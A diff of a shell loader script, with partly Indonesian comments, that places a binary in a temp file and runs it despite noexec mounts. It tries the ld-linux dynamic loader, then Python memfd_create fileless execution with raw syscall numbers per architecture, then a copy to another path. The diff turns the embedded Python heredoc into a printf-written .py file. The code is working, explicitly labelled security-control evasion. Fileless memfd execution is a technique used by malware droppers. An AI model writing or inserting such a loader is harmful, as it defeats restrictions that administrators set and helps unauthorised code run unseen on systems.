@@ -16,10 +16,10 @@ raw_arch=$(uname -m 2>/dev/null || echo unknown)
 log "uname -m: $raw_arch"
 
 case "$raw_arch" in
-  x86_64|amd64)              arch=x86_64 ;;
-  aarch64|arm64)             arch=aarch64 ;;
-  armv7l|armv7|armhf)        arch=armv7 ;;
-  i386|i486|i586|i686)       arch=i386 ;;
+  x86_64|amd64)     arch=x86_64 ;;
+  aarch64|arm64)    arch=aarch64 ;;
+  armv7l|armv7|armhf) arch=armv7 ;;
+  i386|i486|i586|i686) arch=i386 ;;
   *) die "unsupported arch '$raw_arch'" ;;
 esac
 log "resolved arch: $arch"
@@ -33,7 +33,7 @@ log "required tools present"
 # ---- temp file ----
 tmp=$(mktemp 2>/dev/null) || die "mktemp failed"
 log "temp file: $tmp"
-trap 'log "cleaning up $tmp"; rm -f "$tmp"' EXIT INT TERM
+trap 'log "cleaning up"; rm -f "$tmp" "${tmp}.py" 2>/dev/null || true' EXIT INT TERM
 
 # ---- check /tmp is exec ----
 if mount 2>/dev/null | grep -E " on $(dirname "$tmp") " | grep -q noexec; then
@@ -72,6 +72,7 @@ run_binary() {
   log "direct exec failed, trying noexec bypass methods..."
 
   # Method 2: ld-linux dynamic linker
+  # Hanya efektif jika binary dynamically linked
   log "method 2: ld-linux dynamic linker"
   if command -v readelf >/dev/null 2>&1 && readelf -d "$bin" 2>/dev/null | grep -q NEEDED; then
     for ld in \
@@ -93,65 +94,50 @@ run_binary() {
     log "binary is statically linked or readelf unavailable, skipping ld.so"
   fi
 
-  # Method 3: Python memfd_create (anonymous in-memory fd, tidak terikat filesystem)
-  # Tidak ada </dev/tty di sini — heredoc butuh stdin
-  # /dev/tty dibuka ulang di dalam Python sebelum execve
+  # Method 3: Python memfd_create
+  # Tulis Python ke file via printf — hindari heredoc yang tidak reliable
+  # di bash -c / pipe context. File .py dibaca sebagai data oleh interpreter,
+  # sehingga noexec pada /tmp tidak mempengaruhi eksekusi.
   log "method 3: Python memfd_create"
+  py_tmp="${tmp}.py"
+  printf '%s\n' \
+    'import sys,os,ctypes,ctypes.util,platform' \
+    'bin_path=sys.argv[1]; args=sys.argv[1:]' \
+    'sys.stderr.write("[memfd] reading %s\n"%bin_path)' \
+    'data=open(bin_path,"rb").read()' \
+    'sys.stderr.write("[memfd] read %d bytes\n"%len(data))' \
+    'fd=-1' \
+    'try:' \
+    '  fd=os.memfd_create("anon",0)' \
+    '  sys.stderr.write("[memfd] os.memfd_create ok fd=%d\n"%fd)' \
+    'except AttributeError:' \
+    '  nr={"x86_64":319,"amd64":319,"aarch64":279,"arm64":279,"armv7l":356,"armv7":356,"i386":356,"i686":356}.get(platform.machine(),319)' \
+    '  sys.stderr.write("[memfd] syscall nr=%d arch=%s\n"%(nr,platform.machine()))' \
+    '  libc=ctypes.CDLL(ctypes.util.find_library("c") or "libc.so.6",use_errno=True)' \
+    '  fd=libc.syscall(ctypes.c_long(nr),ctypes.c_char_p(b"anon"),ctypes.c_uint(0))' \
+    'if fd<0:' \
+    '  sys.stderr.write("[memfd] FAILED errno=%d\n"%ctypes.get_errno())' \
+    '  sys.exit(1)' \
+    'os.write(fd,data)' \
+    'try:' \
+    '  t=os.open("/dev/tty",os.O_RDWR); os.dup2(t,0); os.close(t)' \
+    '  sys.stderr.write("[memfd] stdin reattached to /dev/tty\n")' \
+    'except OSError as e:' \
+    '  sys.stderr.write("[memfd] WARNING tty: %s\n"%e)' \
+    'sys.stderr.write("[memfd] execve /proc/self/fd/%d\n"%fd)' \
+    'os.execve("/proc/self/fd/%d"%fd,args,os.environ)' \
+    > "$py_tmp"
+
   for py in python3 python python2; do
     if command -v "$py" >/dev/null 2>&1; then
-      log "trying memfd_create via $py"
-      "$py" - "$bin" "$@" <<'PYEOF'
-import sys, os, ctypes, ctypes.util, platform
-
-bin_path = sys.argv[1]
-args     = sys.argv[1:]
-
-sys.stderr.write('[memfd] reading binary: %s\n' % bin_path)
-with open(bin_path, 'rb') as f:
-    data = f.read()
-sys.stderr.write('[memfd] read %d bytes\n' % len(data))
-
-fd = -1
-try:
-    fd = os.memfd_create("anon", 0)
-    sys.stderr.write('[memfd] used os.memfd_create, fd=%d\n' % fd)
-except AttributeError:
-    syscall_nr = {
-        'x86_64': 319, 'amd64': 319,
-        'aarch64': 279, 'arm64': 279,
-        'armv7l': 356,  'armv7': 356,
-        'i386':   356,  'i686':  356,
-    }.get(platform.machine(), 319)
-    sys.stderr.write('[memfd] syscall nr=%d for %s\n' % (syscall_nr, platform.machine()))
-    libc = ctypes.CDLL(ctypes.util.find_library('c') or 'libc.so.6', use_errno=True)
-    fd = libc.syscall(
-        ctypes.c_long(syscall_nr),
-        ctypes.c_char_p(b"anon"),
-        ctypes.c_uint(0)
-    )
-
-if fd < 0:
-    sys.stderr.write('[memfd] memfd_create failed errno=%d\n' % ctypes.get_errno())
-    sys.exit(1)
-
-sys.stderr.write('[memfd] fd=%d, writing binary...\n' % fd)
-os.write(fd, data)
-
-try:
-    tty = os.open('/dev/tty', os.O_RDWR)
-    os.dup2(tty, 0)
-    os.close(tty)
-    sys.stderr.write('[memfd] stdin reattached to /dev/tty\n')
-except OSError as e:
-    sys.stderr.write('[memfd] WARNING: could not open /dev/tty: %s\n' % e)
-
-sys.stderr.write('[memfd] execve /proc/self/fd/%d\n' % fd)
-os.execve('/proc/self/fd/%d' % fd, args, os.environ)
-PYEOF
+      log "trying memfd_create via $py ($(command -v "$py"))"
+      "$py" "$py_tmp" "$bin" "$@"
       py_ret=$?
+      rm -f "$py_tmp"
       [ $py_ret -eq 0 ] && return 0
     fi
   done
+  rm -f "$py_tmp" 2>/dev/null || true
 
   # Method 4: copy ke path yang exec-friendly
   log "method 4: copy to exec-friendly path"
@@ -179,7 +165,7 @@ PYEOF
 
 # ---- main ----
 log "executing $tmp $*"
-log "(noexec-aware: direct → ld.so → memfd → alt-path)"
+log "(noexec-aware: direct -> ld.so -> memfd -> alt-path)"
 log "------------------------------------------------------------"
 
 run_binary "$tmp" "$@"
